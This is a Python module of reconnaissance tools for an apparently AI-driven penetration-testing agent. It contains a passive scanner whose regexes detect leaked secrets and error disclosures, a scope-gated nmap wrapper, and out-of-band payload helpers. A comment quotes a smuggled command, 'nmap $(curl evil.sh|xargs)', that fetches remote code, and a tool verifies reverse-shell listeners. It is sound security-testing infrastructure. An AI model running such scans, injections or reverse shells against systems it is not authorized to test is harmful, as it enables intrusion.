"""hypervisor.tools.vapt.recon — reconnaissance tools (P3, REFACTOR-05).

The oracle's network_tools.py + passive_scanner.py re-hosted on the
Skeleton 9-2 tool plane: every tool is scoped (the permission engine
gates the target), journaled (dispatcher tool_call/tool_result +
permission_decision), duration-bounded (tool.timeout_s + the turn
watchdog), and output-capped (render_capped with the B2 head/tail
discipline).

Tool names are pinned by the Tier-A extractor routing
(memory/extractors.py _TIER_A_PARSERS / _FREE_TEXT_TOOLS):
network_scan_nmap and check_port_listener keep their oracle names so
extraction parity holds; passive_scan and the OOB pair are new local
analysis surfaces.
"""
from __future__ import annotations

import asyncio
import json
import os
import re
import secrets
import socket
from typing import Any, Dict, List, Optional, Tuple

from ...permissions import SafetyClass, extract_targets_from_command
from ..base import Tool, ToolContext, ToolResult

# ─── the passive vulnerability scanner (oracle passive_scanner.py) ────


class PassiveScanner:
    """Comprehensive passive security scanner — pattern batteries
    verbatim from 3.7.3 tools/passive_scanner.py (SQL errors, stack
    traces, secrets, version disclosures, injection indicators, API
    routes, mobile flags, crypto weaknesses)."""

    SQL_ERROR_PATTERNS = [
        (r"SQL syntax.*MariaDB|warning: mysql_|MySQLSyntaxErrorException",
         "MySQL Error"),
        (r"PostgreSQL query failed|pg_query\(|PSQLException",
         "PostgreSQL Error"),
        (r"ORA-[0-9]{5}|OracleException", "Oracle Error"),
        (r"SQLite/JDBCDriver|SQLITE_ERROR|sqlite3\.OperationalError",
         "SQLite Error"),
        (r"Microsoft SQL Server|SQLServerException|sqlsrv_query",
         "MSSQL Error"),
        (r"Syntax error in SQL statement|JDBCDriver", "Generic SQL Error"),
        (r"Incorrect syntax near|Unclosed quotation mark", "T-SQL Error"),
        (r"PG::SyntaxError|PG::Error", "PostgreSQL Ruby Error"),
        (r"SQLITE_CONSTRAINT|FOREIGN KEY constraint failed",
         "SQLite Constraint"),
    ]

    STACK_TRACE_PATTERNS = [
        (r"Traceback \(most recent call last\):", "Python Stack Trace"),
        (r"at org\.apache\.|java\.lang\.\w+Exception", "Java Stack Trace"),
        (r"at System\.|System\.NullReferenceException|System\.Exception",
         ".NET Stack Trace"),
        (r"Fatal error: Uncaught|PHP Fatal error|PHP Stack trace",
         "PHP Stack Trace"),
        (r"ruby.*\.rb:\d+:in.*Error", "Ruby Stack Trace"),
        (r"node:\d+|TypeError:|ReferenceError:", "Node.js Stack Trace"),
        (r"panic:|goroutine", "Go Stack Trace"),
        (r"segmentation fault|core dumped", "Segfault"),
    ]

    SECRET_PATTERNS = [
        (r"AKIA[0-9A-Z]{16}", "AWS Access Key", "CRITICAL"),
        (r"aws_secret_access_key\s*[=:]\s*([A-Za-z0-9/+=]{40})",
         "AWS Secret Key", "CRITICAL"),
        (r"AIza[0-9A-Za-z\-_]{35}", "Google API Key", "HIGH"),
        (r"ya29\.[0-9A-Za-z\-_]+", "Google OAuth Token", "HIGH"),
        (r"sk_live_[0-9a-zA-Z]{24}", "Stripe Live Key", "CRITICAL"),
        (r"rk_live_[0-9a-zA-Z]{24}", "Stripe Restricted Key", "CRITICAL"),
        (r"gh[ps]_[0-9a-zA-Z]{36}", "GitHub Token", "CRITICAL"),
        (r"glpat-[0-9a-zA-Z\-]{20}", "GitLab Token", "CRITICAL"),
        (r"xox[baprs]-[0-9a-zA-Z-]{10,}", "Slack Token", "HIGH"),
        (r"-----BEGIN (RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----",
         "Private Key", "CRITICAL"),
        (r"eyJ[a-zA-Z0-9_-]{5,}\.eyJ[a-zA-Z0-9_-]{5,}\.[a-zA-Z0-9_-]+",
         "JWT Token", "MEDIUM"),
        (r"eyJ[a-zA-Z0-9_-]{5,}\.eyJ[a-zA-Z0-9_-]{5,}\.",
         "JWT Token (no sig)", "MEDIUM"),
        (r"https://[a-z0-9-]+:[a-z0-9-]+@[a-z0-9.-]+\.[a-z]{2,}",
         "URL with Credentials", "HIGH"),
        (r"api[_-]?key\s*[=:]\s*['\"][A-Za-z0-9\-_]{20,}['\"]",
         "Generic API Key", "HIGH"),
        (r"secret\s*[=:]\s*['\"][A-Za-z0-9\-_]{20,}['\"]",
         "Generic Secret", "HIGH"),
        (r"password\s*[=:]\s*['\"][^'\"]{8,}['\"]",
         "Password in Code", "MEDIUM"),
        (r"Bearer\s+[A-Za-z0-9\-_\.=]{20,}", "Bearer Token", "MEDIUM"),
        (r"client_secret\s*[=:]\s*['\"][^'\"]+['\"]",
         "OAuth Client Secret", "HIGH"),
        (r"firebase_url.*https://[a-z0-9-]+\.firebaseio\.com",
         "Firebase URL", "MEDIUM"),
        (r"x-amz-security-token.*[A-Za-z0-9/+=]{100,}",
         "AWS STS Token", "CRITICAL"),
        (r"mongodb(\+srv)?:\/\/[^\s]+'", "MongoDB Connection String",
         "HIGH"),
        (r"postgres(ql)?:\/\/[^\s]+@", "PostgreSQL Connection String",
         "HIGH"),
        (r"mysql:\/\/[^\s]+@", "MySQL Connection String", "HIGH"),
        (r"redis:\/\/[^\s]+@", "Redis Connection String", "MEDIUM"),
        (r"circle-token[=:]\s*[a-f0-9]{40}", "CircleCI Token", "HIGH"),
        (r"TF_VAR_.*[=:]\s*[A-Za-z0-9+/=]{20,}",
         "Terraform Variable Secret", "HIGH"),
        (r"maps_api_key\s*[=:]\s*['\"][^'\"]+['\"]",
         "Maps API Key", "MEDIUM"),
        (r"google_maps_key\s*[=:]\s*['\"][^'\"]+['\"]",
         "Google Maps Key", "MEDIUM"),
    ]

    VERSION_DISCLOSURE_PATTERNS = [
        (r"Server:\s*(Apache|nginx|IIS|lighttpd|LiteSpeed)[/\s]([\d.]+)",
         "HTTP Server Version"),
        (r"X-Powered-By:\s*(PHP|ASP\.NET|Express|JSP)[/\s]?([\d.]*)",
         "X-Powered-By Header"),
        (r"X-AspNet-Version:\s*([\d.]+)", "ASP.NET Version"),
        (r"X-Generator:\s*(Drupal|Joomla|WordPress)\s*([\d.]+)",
         "CMS Generator"),
        (r"<meta name=\"generator\" content=\"([^\"]+)\"",
         "HTML Generator Meta"),
        (r"Set-Cookie:.*sessionid=.*;.*path=/", "Session Cookie Pattern"),
        (r"X-Frame-Options:\s*(DENY|SAMEORIGIN)",
         "X-Frame-Options (good)"),
        (r"(?i)Strict-Transport-Security:", "HSTS Header (good)"),
        (r"(?i)Content-Security-Policy:", "CSP Header (good)"),
    ]

    INJECTION_INDICATORS = [
        (r"Warning:.*\bsql\b|error in your SQL syntax",
         "SQL Injection Indicator"),
        (r"eval\(\)|Function\(|setTimeout\(['\"]", "Potential XSS Sink"),
        (r"system\(\)|exec\(\)|popen\(\)|shell_exec\(\)",
         "Command Injection Sink"),
        (r"include\(|require\(|include_once\(|require_once\(",
         "File Inclusion Sink"),
        (r"unserialize\(|pickle\.loads\(", "Deserialization Sink"),
        (r"XMLHttpRequest\(\).*open\(['\"](GET|POST)", "AJAX Endpoint"),
    ]

    API_PATTERNS = [
        (r"/graphql/?$|/v\d+/graphql/?$", "GraphQL Endpoint"),
        (r"/api/v\d+/[a-zA-Z]+", "REST API Endpoint"),
        (r"/swagger\.json|/api-docs|/openapi\.json", "API Documentation"),
        (r"/\.well-known/(openid-configuration|jwks\.json)",
         "OIDC Discovery"),
        (r"/oauth/(authorize|token|callback)", "OAuth Endpoint"),
        (r"/\.env|/\.git/config|/\.git/HEAD", "Sensitive File Exposure"),
        (r"/wp-admin/|/wp-login\.php|/wp-content/", "WordPress Admin"),
        (r"/administrator/|/admin\.php", "Admin Panel"),
        (r"/phpmyadmin/|/pma/", "phpMyAdmin"),
        (r"/actuator/(health|env|beans|mappings)",
         "Spring Boot Actuator"),
        (r"/debug/pprof|/debug/vars", "Go Debug Endpoints"),
        (r"/_next/data/|/_nuxt/", "Next.js/Nuxt.js Data Route"),
    ]

    MOBILE_PATTERNS = [
        (r"android:debuggable=\"true\"", "Debuggable Android App"),
        (r"android:allowBackup=\"true\"", "Backup Enabled Android"),
        (r"android:usesCleartextTraffic=\"true\"",
         "Cleartext Traffic Android"),
        (r"android:exported=\"true\"", "Exported Component Android"),
        (r"NSAllowsArbitraryLoads", "iOS ATS Disabled"),
        (r"CFBundleIdentifier", "iOS Bundle ID"),
        (r"kSecAttrAccessibleWhenUnlocked", "iOS Keychain Access"),
        (r"TrustManager.*checkServerTrusted", "Custom TrustManager"),
        (r"CertificatePinner.*pin", "Certificate Pinning"),
        (r"com\.google\.firebase", "Firebase Usage"),
        (r"amplitude\.com|mixpanel\.com", "Analytics SDK"),
    ]

    CRYPTO_WEAKNESS_PATTERNS = [
        (r"DES\b|3DES\b|RC4\b|MD5\b|SHA-?1\b", "Weak Crypto Algorithm"),
        (r"ECB\b|electronic codebook", "ECB Mode (insecure)"),
        (r"hardcoded.*key|secret.*=.*['\"]", "Potential Hardcoded Key"),
        (r"SecureRandom\.getInstance\(\"SHA1PRNG\"\)", "Insecure PRNG"),
        (r"new Random\(\)", "Non-secure Random"),
        (r"Cipher\.getInstance\(\"AES\"\)", "Default AES (likely ECB)"),
    ]

    @staticmethod
    def scan_text(text: str) -> List[str]:
        """Scan text for all security indicators."""
        if not text:
            return []
        alerts: List[str] = []
        for pattern, name in PassiveScanner.SQL_ERROR_PATTERNS:
            if re.search(pattern, text, re.IGNORECASE):
                alerts.append(f"[VULN] SQL_ERROR_LEAK: {name} detected "
                              f"in response")
        for pattern, name in PassiveScanner.STACK_TRACE_PATTERNS:
            if re.search(pattern, text, re.IGNORECASE):
                alerts.append(f"[VULN] STACK_TRACE: {name} exposed")
        for pattern, name, severity in PassiveScanner.SECRET_PATTERNS:
            if re.search(pattern, text, re.IGNORECASE):
                alert = f"[{severity}] SECRET_EXPOSED: {name}"
                if alert not in alerts:
                    alerts.append(alert)
        for pattern, name in PassiveScanner.VERSION_DISCLOSURE_PATTERNS:
            m = re.search(pattern, text, re.IGNORECASE)
            if m:
                value = m.group(0)[:80]
                if "good" in name.lower():
                    alerts.append(f"[INFO] SECURITY_HEADER: {name} - "
                                  f"{value}")
                else:
                    alerts.append(f"[VULN] VERSION_DISCLOSURE: {name} - "
                                  f"{value}")
        for pattern, name in PassiveScanner.INJECTION_INDICATORS:
            if re.search(pattern, text):
                alerts.append(f"[VULN] INJECTION_INDICATOR: {name}")
        for pattern, name in PassiveScanner.API_PATTERNS:
            if re.search(pattern, text, re.IGNORECASE):
                alerts.append(f"[API] {name}")
        for pattern, name in PassiveScanner.MOBILE_PATTERNS:
            if re.search(pattern, text):
                alerts.append(f"[MOBILE] {name}")
        for pattern, name in PassiveScanner.CRYPTO_WEAKNESS_PATTERNS:
            if re.search(pattern, text, re.IGNORECASE):
                alerts.append(f"[VULN] CRYPTO_WEAKNESS: {name}")
        return alerts

    @staticmethod
    def scan_headers(headers: Dict[str, str]) -> List[str]:
        """Scan HTTP response headers for security issues (missing
        security headers, CORS wildcard, server version)."""
        alerts: List[str] = []
        headers_lower = {k.lower(): v for k, v in headers.items()}
        security_headers = {
            "x-frame-options": "Clickjacking Protection",
            "x-content-type-options": "MIME Sniffing Protection",
            "strict-transport-security": "HSTS",
            "content-security-policy": "CSP",
        }
        for header, name in security_headers.items():
            if header not in headers_lower:
                alerts.append(f"[VULN] MISSING_HEADER: {name} ({header})")
        acao = headers_lower.get("access-control-allow-origin")
        if acao == "*":
            alerts.append("[VULN] CORS_WILDCARD: "
                          "Access-Control-Allow-Origin is *")
        server = headers_lower.get("server")
        if server and re.search(r"\d+\.\d+", server):
            alerts.append(f"[VULN] SERVER_VERSION: {server}")
        return alerts


# ─── network_scan_nmap (oracle network_tools.py, N5 sanitization) ────

class NetworkScanTool(Tool):
    """Performs a network scan using nmap. Validates the target against
    engagement scope, sanitizes arguments (the N5 blocklist: command
    substitution, backticks and newlines join ;|&$), and renders a
    best-effort structured parse of the plain output (hosts, ports,
    services) with the raw output as the fallback — jc is not a 4.0
    dependency, so the structured layer is the 4.0 plain-text parser
    and the extractor accepts either shape."""

    name = "network_scan_nmap"
    aliases = ("nmap_scan",)
    input_schema = {
        "type": "object",
        "properties": {
            "target": {
                "type": "string", "minLength": 3, "maxLength": 500,
                "description": "Scan target (host, IP or CIDR) — must "
                               "be inside the engagement scope.",
            },
            "arguments": {
                "type": "string", "maxLength": 300,
                "default": "-F",
                "description": "nmap arguments (default -F). "
                               "Shell metacharacters are rejected.",
            },
        },
        "required": ["target"],
        "additionalProperties": False,
    }
    timeout_s = 600.0

    def prompt(self) -> str:
        return ("Perform an nmap scan of an in-scope target. Returns a "
                "structured host/port/service summary derived from the "
                "scan output, with the raw output appended. Scans are "
                "scope-gated and duration-bounded; use targeted "
                "arguments (-F, -p, -sV) rather than broad ones.")

    def safety_class(self, args: Dict[str, Any]) -> SafetyClass:
        return SafetyClass.EXPLOIT       # an active network touch

    def concurrency_safe(self, args: Dict[str, Any]) -> bool:
        return False                     # heavy scans serialize

    def extract_targets(self, args: Dict[str, Any]) -> List[str]:
        t = str(args.get("target", "")).strip()
        return [t] if t else []

    def validate_input(self, args: Dict[str, Any]) -> Optional[str]:
        arguments = str(args.get("arguments", "-F"))
        # N5 fix parity: the blocklist covers ; | & ` $ and newlines —
        # the original ; | & check let "nmap $(curl evil.sh|xargs)"
        # through the shell.
        if any(ch in arguments for ch in (";", "|", "&", "`", "$",
                                          "\n", "\r")):
            return ("Security Error: Illegal characters in arguments.")
        if not str(args.get("target", "")).strip():
            return "target required"
        return None

    def description(self, args: Dict[str, Any]) -> str:
        return (f"nmap {args.get('arguments', '-F')} "
                f"{args.get('target', '')}")[:120]

    async def call(self, args: Dict[str, Any],
                   ctx: ToolContext) -> ToolResult:
        import shlex
        target = str(args.get("target", "")).strip()
        arguments = str(args.get("arguments") or "-F")
        safe_target = shlex.quote(target)
        command = f"nmap {arguments} {safe_target}"
        try:
            proc = await asyncio.create_subprocess_shell(
                command, cwd=ctx.workspace,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.STDOUT,
                preexec_fn=os.setsid)
        except OSError as exc:
            return ToolResult.error(f"failed to spawn nmap: {exc}",
                                    command=command)
        try:
            out, _ = await asyncio.wait_for(proc.communicate(),
                                            timeout=self.timeout_s)
        except asyncio.TimeoutError:
            try:
                os.killpg(os.getpgid(proc.pid), 9)
            except (ProcessLookupError, PermissionError, OSError):
                pass
            return ToolResult.error(
                f"scan exceeded {self.timeout_s:.0f}s (process group "
                f"killed) — narrow the target or arguments",
                command=command)
        raw = out.decode("utf-8", "replace") if out else ""
        code = proc.returncode
        structured = _parse_nmap_plain(raw)
        if code != 0 and not raw.strip():
            return ToolResult.error(
                f"nmap failed (code {code})",
                command=command, exit_code=code)
        if structured is not None:
            body = (f"Nmap structured parse:\n"
                    f"{json.dumps(structured, indent=2)}\n\n"
                    f"--- raw output ---\n{raw}")
        else:
            body = f"Nmap output (raw fallback):\n{raw}"
        return ToolResult(body, is_error=code != 0,
                          metadata={"exit_code": code,
                                    "command": command})


def _parse_nmap_plain(raw: str) -> Optional[List[Dict[str, Any]]]:
    """Best-effort structured parse of plain nmap output (the 4.0
    stand-in for jc.parse('nmap')): one host record per 'Nmap scan
    report' block, with hostname/address and the port table. Returns
    None when the output carries no recognizable host block (error
    text, binary, empty)."""
    if "Nmap scan report" not in raw:
        return None
    hosts: List[Dict[str, Any]] = []
    current: Optional[Dict[str, Any]] = None
    for line in raw.splitlines():
        m = re.match(r"Nmap scan report for (.+)", line.strip())
        if m:
            ident = m.group(1).strip()
            hm = re.match(r"^(.+?)\s*\(([\d.]+)\)$", ident)
            if hm:
                current = {"hostname": hm.group(1), "address": hm.group(2)}
            elif re.match(r"^[\d.]+$", ident):
                current = {"hostname": "", "address": ident}
            else:
                current = {"hostname": ident, "address": ""}
            current["ports"] = []
            hosts.append(current)
            continue
        pm = re.match(
            r"(\d+/(?:tcp|udp|sctp))\s+(\S+)\s+(\S+)"
            r"(?:\s+(.*))?", line.strip())
        if pm and current is not None:
            entry: Dict[str, Any] = {
                "port": pm.group(1), "state": pm.group(2),
                "service": pm.group(3)}
            if pm.group(4):
                entry["version"] = pm.group(4)[:120]
            current["ports"].append(entry)
    return hosts or None


# ─── check_port_listener (oracle) ─────────────────────────────────────

class PortListenerTool(Tool):
    """Checks if a local port is listening (reverse-shell verification).
    Local-only: no scope targets, READ class."""

    name = "check_port_listener"
    input_schema = {
        "type": "object",
        "properties": {
            "port": {"type": "integer", "minimum": 1, "maximum": 65535},
        },
        "required": ["port"],
        "additionalProperties": False,
    }
    timeout_s = 15.0

    def prompt(self) -> str:
        return ("Check whether a LOCAL port on this machine is "
                "listening (useful to verify a reverse-shell handler). "
                "Returns structured JSON: {port, listening}.")

    def safety_class(self, args: Dict[str, Any]) -> SafetyClass:
        return SafetyClass.READ

    async def call(self, args: Dict[str, Any],
                   ctx: ToolContext) -> ToolResult:
        port = int(args.get("port", 0))
        try:
            reader, writer = await asyncio.open_connection(
                "127.0.0.1", port)
        except (OSError, ConnectionRefusedError):
            return ToolResult(
                json.dumps({"port": port, "listening": False}),
                metadata={"port": port, "listening": False})
        writer.close()
        try:
            await writer.wait_closed()
        except Exception:
            pass
        return ToolResult(json.dumps({"port": port, "listening": True}),
                          metadata={"port": port, "listening": True})


# ─── passive_scan (the scanner as a tool surface) ─────────────────────

class PassiveScanTool(Tool):
    """Runs the passive security scanner over text or a workspace file:
    the oracle's invisibly-on-every-output pattern battery, exposed as
    an explicit local analysis tool (READ class, no scope targets)."""

    name = "passive_scan"
    input_schema = {
        "type": "object",
        "properties": {
            "text": {
                "type": "string", "maxLength": 200000,
                "description": "Text to scan (omit when file is given).",
            },
            "file": {
                "type": "string", "maxLength": 400,
                "description": "Workspace-relative file to scan "
                               "(resolved through the workspace "
                               "resolver; traversal is refused).",
            },
        },
        "additionalProperties": False,
    }
    timeout_s = 30.0
    path_args = ("file",)

    def prompt(self) -> str:
        return ("Run the passive security scanner over text or a "
                "workspace file: SQL errors, stack traces, exposed "
                "secrets, version disclosures, injection indicators, "
                "API routes, mobile flags, crypto weaknesses. Local "
                "analysis only — nothing is sent anywhere.")

    def safety_class(self, args: Dict[str, Any]) -> SafetyClass:
        return SafetyClass.READ

    def validate_input(self, args: Dict[str, Any]) -> Optional[str]:
        if not (args.get("text") or args.get("file")):
            return "one of text or file is required"
        return None

    async def call(self, args: Dict[str, Any],
                   ctx: ToolContext) -> ToolResult:
        text = str(args.get("text", "") or "")
        fpath = str(args.get("file", "") or "")
        if fpath:
            from ...permissions import resolve_safe_path
            resolved = resolve_safe_path(fpath, ctx.workspace)
            if resolved is None:
                return ToolResult.error(
                    f"path {fpath!r} escapes the engagement workspace")
            try:
                with open(resolved, "r", encoding="utf-8",
                          errors="replace") as f:
                    text = f.read(500_000)
            except OSError as exc:
                return ToolResult.error(f"unreadable: {exc}")
        alerts = PassiveScanner.scan_text(text)
        body = (json.dumps({"alerts": alerts, "count": len(alerts)},
                           indent=2)
                if alerts else "No security indicators detected.")
        return ToolResult(body,
                          metadata={"alerts": len(alerts)})


# ─── OOB interaction channel (oracle web_tools_v2 pair) ───────────────

def _oob_dir(workspace: str) -> str:
    return os.path.join(workspace, "oob")


class OobPayloadTool(Tool):
    """Generates a unique out-of-band interaction payload/tag plus the
    configured OOB domain. Interactions land in workspace/oob/<tag>.log
    when the operator runs the receiver (AEGIS_OOB_DOMAIN names the
    domain; default oob.local for lab use)."""

    name = "generate_oob_payload"
    aliases = ("oob_payload",)
    input_schema = {
        "type": "object",
        "properties": {
            "tag": {
                "type": "string", "minLength": 3, "maxLength": 40,
                "pattern": "^[a-z0-9][a-z0-9-]*$",
                "description": "Optional label folded into the payload "
                               "(default: a random tag).",
            },
        },
        "additionalProperties": False,
    }
    timeout_s = 10.0

    def prompt(self) -> str:
        return ("Generate a unique out-of-band (OOB) detection payload: "
                "a random tag + the configured OOB domain. Use the "
                "payload in injection tests; later poll_oob_interactions "
                "reports any interactions recorded for it.")

    def safety_class(self, args: Dict[str, Any]) -> SafetyClass:
        return SafetyClass.WRITE

    async def call(self, args: Dict[str, Any],
                   ctx: ToolContext) -> ToolResult:
        label = str(args.get("tag", "") or "").strip().lower()
        rand = secrets.token_hex(6)
        tag = f"{label}-{rand}" if label else rand
        domain = os.environ.get("AEGIS_OOB_DOMAIN", "oob.local")
        payload = f"{tag}.{domain}"
        return ToolResult(
            json.dumps({"tag": tag, "domain": domain,
                        "payload": payload, "full_dns": payload,
                        "poll_path": f"workspace/oob/{tag}.log"}),
            metadata={"tag": tag, "payload": payload})


class OobPollTool(Tool):
    """Polls recorded OOB interactions: every workspace/oob/<tag>.log
    written by the receiver since the last poll. READ class, local."""

    name = "poll_oob_interactions"
    aliases = ("oob_poll",)
    input_schema = {
        "type": "object",
        "properties": {
            "tag": {
                "type": "string", "maxLength": 60,
                "description": "Only report interactions for this tag "
                               "(default: all).",
            },
        },
        "additionalProperties": False,
    }
    timeout_s = 15.0

    def prompt(self) -> str:
        return ("Poll out-of-band interactions recorded by the OOB "
                "receiver under workspace/oob/. Returns the interaction "
                "log entries (timestamp, source, detail) for the tag "
                "or for all tags.")

    def safety_class(self, args: Dict[str, Any]) -> SafetyClass:
        return SafetyClass.READ

    async def call(self, args: Dict[str, Any],
                   ctx: ToolContext) -> ToolResult:
        tag = str(args.get("tag", "") or "").strip()
        root = _oob_dir(ctx.workspace)
        rows: List[Dict[str, Any]] = []
        if os.path.isdir(root):
            for name in sorted(os.listdir(root)):
                if not name.endswith(".log"):
                    continue
                stem = name[:-4]
                if tag and tag not in stem:
                    continue
                path = os.path.join(root, name)
                try:
                    with open(path, "r", encoding="utf-8",
                              errors="replace") as f:
                        for line in f:
                            line = line.strip()
                            if not line:
                                continue
                            try:
                                rows.append(json.loads(line))
                            except json.JSONDecodeError:
                                rows.append({"raw": line[:400], "tag": stem})
                except OSError:
                    continue
        if not rows:
            return ToolResult(
                "No OOB interactions recorded"
                + (f" for tag {tag!r}" if tag else "") + ".")
        return ToolResult(
            json.dumps({"interactions": rows[:200],
                        "count": len(rows)}, indent=2),
            metadata={"count": len(rows)})
